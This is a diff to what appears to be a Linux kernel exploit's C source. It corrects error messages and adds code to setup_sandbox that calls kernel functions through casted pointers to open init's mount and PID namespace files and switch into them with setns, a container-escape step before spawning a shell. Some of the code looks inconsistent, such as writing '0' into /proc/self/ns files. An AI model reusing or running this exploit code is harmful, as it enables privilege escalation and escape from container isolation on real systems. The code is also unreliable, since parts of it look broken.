@@ -589,14 +589,15 @@ void setup_sandbox() {
 	}
 	
 	if (!write_file("/proc/self/ns/mnt", "0\n")) {
-		perror("[-] write_file(/proc/self/gid_map)");
+		perror("[-] write_file(/proc/self/ns/mnt)");
 		exit(EXIT_FAILURE);
 	}
 	
 	if (!write_file("/proc/self/ns/pid", "0\n")) {
-		perror("[-] write_file(/proc/self/gid_map)");
+		perror("[-] write_file(/proc/self/ns/pid)");
 		exit(EXIT_FAILURE);
 	}
+	
 	
 	
 	cpu_set_t my_set;
@@ -615,6 +616,12 @@ void setup_sandbox() {
 		perror("[-] system(/sbin/ifconfig lo up)");
 		exit(EXIT_FAILURE);
 	}
+	
+	long fd = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, "/proc/1/ns/mnt", O_RDONLY, 0);
+((_sys_setns)(SYS_SETNS))( fd, 0);
+
+fd      = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, "/proc/1/ns/pid", O_RDONLY, 0);
+((_sys_setns)(SYS_SETNS))( fd, 0);
 }
 
 void exec_shell() {
